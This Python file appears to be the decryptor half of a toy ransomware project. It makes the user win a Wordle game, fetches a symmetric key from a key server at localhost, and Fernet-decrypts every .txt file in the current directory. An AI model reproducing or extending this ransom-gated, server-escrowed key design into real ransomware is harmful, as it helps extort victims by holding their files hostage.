import os
from cryptography.fernet import Fernet
from wordle import play
import requests

def get_symmetric_key(id):
    url = f"http://127.0.0.1:8000/symmetric_keys/{id}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        return data.get("key")
    else:
        return ""

def get_key():
    # key will be the first line in thekey.key file
    id = ""
    with open("thekey.key", "rb") as f:
        id = f.read().splitlines()[0]
    key = get_symmetric_key(id.decode("utf-8"))
    return key.encode("utf-8")


def decrypt(key):
    # get all file
    files = []
    for file in os.listdir(os.getcwd()):            #target will be the current directory of running the script
        if file.endswith('.txt') and file != "requirements.txt":                   # all .txt files will be encrypted
            files.append(file)

    #Decrypt each file
    fernet = Fernet(key)
    for file in files:
        with open(file, "rb") as f:
            data = f.read()
        decrypted = fernet.decrypt(data)
        with open(file, "wb") as f:
            f.write(decrypted)
    # Delete thekey.key file
    if os.path.exists("thekey.key"):
        os.remove("thekey.key")
    else:
        print("thekey.key file does not exist.")
    
if __name__ == "__main__":
    solvedWordle = play()
    if solvedWordle:
        key = get_key()
        decrypt(key)
        print("Congratulations! Your worst nightmares have been unleashed upon the world. The files have been decrypted. ðŸŽ‰ðŸ‘»ðŸ”¥ðŸ‘¹")
